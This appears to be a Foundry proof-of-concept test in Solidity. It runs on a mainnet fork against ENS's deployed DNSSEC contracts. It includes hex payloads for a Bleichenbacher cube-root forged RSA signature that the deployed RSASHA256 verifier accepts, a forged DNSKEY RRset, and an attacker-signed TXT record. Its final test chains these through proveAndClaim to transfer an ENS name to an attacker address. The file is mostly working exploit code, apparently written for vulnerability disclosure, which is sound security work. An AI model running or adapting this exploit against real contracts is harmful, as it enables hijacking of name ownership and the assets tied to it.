// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";

interface IAlgorithm {
    function verify(bytes calldata key, bytes calldata data, bytes calldata sig)
        external view returns (bool);
}

interface IDNSSEC {
    struct RRSetWithSignature { bytes rrset; bytes sig; }
    function verifyRRSet(RRSetWithSignature[] memory input, uint256 now)
        external view returns (bytes memory rrs, uint32 inception);
}

interface IDNSRegistrar {
    function proveAndClaim(bytes memory name, IDNSSEC.RRSetWithSignature[] memory input) external;
}

interface IENS {
    function owner(bytes32 node) external view returns (address);
}

contract PoC is Test {

    // Mainnet deployed contracts.
    address constant RSASHA256_ALGO = 0x9D1B5a639597f558bC37Cf81813724076c5C1e96;
    address constant DNSSEC_IMPL    = 0x0fc3152971714E5ed7723FAFa650F86A4BaF30C5;
    address constant DNS_REGISTRAR  = 0xB32cB5677a7C971689228EC835800432B339bA2B;
    address constant ENS_REGISTRY   = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;

    // keccak256(abi.encode(0)) -- storage data slot for DNSSECImpl.anchors.
    bytes32 constant DATA_SLOT = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563;

    // .cc KSK DNSKEY RDATA (e=3, 2048-bit).
    bytes constant KSK_RDATA = hex"010103080103e97b1c85abf704ec6f8a87557db65ee771c1f0487dca469b26e91aa3dcb1dd2352e1699a6a7e5ff283d7a5718fc8d06de8ec273e055dd1a45a526574add45087eff826f151bd7a2e50c50a0272b84857f1080f35bc13ea15284fff16d08ff569d9eda9b827eb44ae774823e9ad25da69b806235e4eee6f4b6059f79b977ccb1f0652c52209e19580103bf35789ef054d40c5d3700589da7161aa337f11121e67b133a4cac5f74ee1fd548cf9953ddc68cac55f28aaf1a2c15e8f4a6267f04ecff0af6aad76f0f7805aaca4edb6ac3c8414fb2b6480c142d071fe12451c0cef85a406b37cc7f95ceed61ae38bd19912f642e1d861ccc125d7c6510e939e6ec699";

    // Forged DNSKEY RRset: RRSIG header (keytag=519, signer=cc.) + KSK + attacker ZSK.
    bytes constant STEP1_RRSET = hex"0030080100015180773594006553f10102070263630002636300003000010001518001080100030803010001ead8d1fc5adb27f08f3402852271c8dac687baeb02a66fd75c8ce7edba7a74ebf8ce5d3fd841d41c07afdcd0441dc7d66c39ffa4b92559a6d1257a944d0ea04b4e18ad64adac1577528d4f3ca23a52d4e81e35a7a4e84e2508339258d9312a3fa142d9a7e2d99725379a50aad0c6d8b6013aa8317a0328874df47beae92ad4f915fa7eaded1498809f6da521d922d3292a16a9c2d6f724242fb38e117efcf8d8ceccd12591637776e8bd1b35835abe3490de31a88ca27ae784791776310d4c93b9a490f6abde45fab6236155a7e13bd8b273ec6b4620db6f10a9babbaf338195dec7a6d5b1b9f603f74e2881ee0723dd1e624ec34ea06f18543b882d1a7322b70263630000300001000151800106010103080103e97b1c85abf704ec6f8a87557db65ee771c1f0487dca469b26e91aa3dcb1dd2352e1699a6a7e5ff283d7a5718fc8d06de8ec273e055dd1a45a526574add45087eff826f151bd7a2e50c50a0272b84857f1080f35bc13ea15284fff16d08ff569d9eda9b827eb44ae774823e9ad25da69b806235e4eee6f4b6059f79b977ccb1f0652c52209e19580103bf35789ef054d40c5d3700589da7161aa337f11121e67b133a4cac5f74ee1fd548cf9953ddc68cac55f28aaf1a2c15e8f4a6267f04ecff0af6aad76f0f7805aaca4edb6ac3c8414fb2b6480c142d071fe12451c0cef85a406b37cc7f95ceed61ae38bd19912f642e1d861ccc125d7c6510e939e6ec699";

    // Bleichenbacher cube-root forged signature. S^3 < N, no modular reduction.
    bytes constant STEP1_SIG = hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007342a7c0ca36163b36015733752b1f3618c5a05732c95d83e483f75c9ebdf4f9";

    // TXT RRset: _ens.test.cc with attacker address, signed by attacker ZSK.
    bytes constant STEP2_RRSET = hex"0010080300015180773594006553f1014e7002636300045f656e730474657374026363000010000100015180002d2c613d307844656144626565666445416462656566644561646245454664656164626545466445614462656546";

    // Legitimate RSASHA256 signature from attacker ZSK private key.
    bytes constant STEP2_SIG = hex"11f0657efe834990c8d6c9df3f369293277880068aaaa81fb0088124935776a631496f20285a0d90004cfecd6e4d57bf6e464c6a2c8907c642bf4f0cee838789dbf32e8d3b008f082bc52913762f8e52e4e2f6968814a2754c0f76e8ccd0ddb10586bb3bf3e721c90415a5faaf519c71a391d9d5067628c29d5c8c7b8590ae2440a8c41f1b24416b16b928a7eb506d68c12ac2fab879a73d9768e4841820785e8cab485d6574eb49ec541e23fbc823a605eee97dbf08d88e8fca9c5cdc8bbb8d94ef5a9438b1da88bcf08ee00c8f3f25d1c545f5f21b92d06c0d1adbfc5c53e8a1b776838f2ccf7f494b0b379d27f1784279982c94e7c56a0b74d67e4f1ecede";

    // DNS wire-format name for "test.cc".
    bytes constant TARGET_NAME = hex"047465737402636300";

    address constant ATTACKER = 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;
    bytes32 constant TARGET_NAMEHASH = 0xbafffdf57e1fb3a6a5d9e5c5366533a4b8dcfcdb15d3a2d773de797bbfa7f7d4;

    function setUp() public {
        require(DNSSEC_IMPL.code.length > 0, "not on mainnet fork");

        // Overwrite DNSSECImpl.anchors with .cc DS record.
        // Bypasses root->TLD chain (root KSK uses e=65537, not vulnerable).
        vm.store(DNSSEC_IMPL, bytes32(uint256(0)), bytes32(uint256(101)));
        vm.store(DNSSEC_IMPL, DATA_SLOT, 0x02636300002b000100015180002402070802e1ec6495abd34562e6f433dee201);
        vm.store(DNSSEC_IMPL, bytes32(uint256(DATA_SLOT) + 1), 0xe6c6a52cb10af69c04d675da692d2d5668970000000000000000000000000000);
        vm.store(DNSSEC_IMPL, bytes32(uint256(DATA_SLOT) + 2), bytes32(0));

        vm.warp(1800000000);
    }

    // Forged signature passes deployed RSASHA256Algorithm.verify().
    function test_forged_sig_accepted() public {
        assertTrue(IAlgorithm(RSASHA256_ALGO).verify(KSK_RDATA, STEP1_RRSET, STEP1_SIG));
    }

    // Control: random signature rejected.
    function test_random_sig_rejected() public {
        bytes memory badSig = new bytes(256);
        badSig[255] = 0x01;
        assertFalse(IAlgorithm(RSASHA256_ALGO).verify(KSK_RDATA, STEP1_RRSET, badSig));
    }

    // Full chain: forged proof -> proveAndClaim -> ENS ownership transfer.
    function test_ens_takeover() public {
        assertTrue(IENS(ENS_REGISTRY).owner(TARGET_NAMEHASH) != ATTACKER);

        IDNSSEC.RRSetWithSignature[] memory input = new IDNSSEC.RRSetWithSignature[](2);
        input[0] = IDNSSEC.RRSetWithSignature(STEP1_RRSET, STEP1_SIG);
        input[1] = IDNSSEC.RRSetWithSignature(STEP2_RRSET, STEP2_SIG);

        IDNSRegistrar(DNS_REGISTRAR).proveAndClaim(TARGET_NAME, input);

        assertEq(IENS(ENS_REGISTRY).owner(TARGET_NAMEHASH), ATTACKER);
    }
}
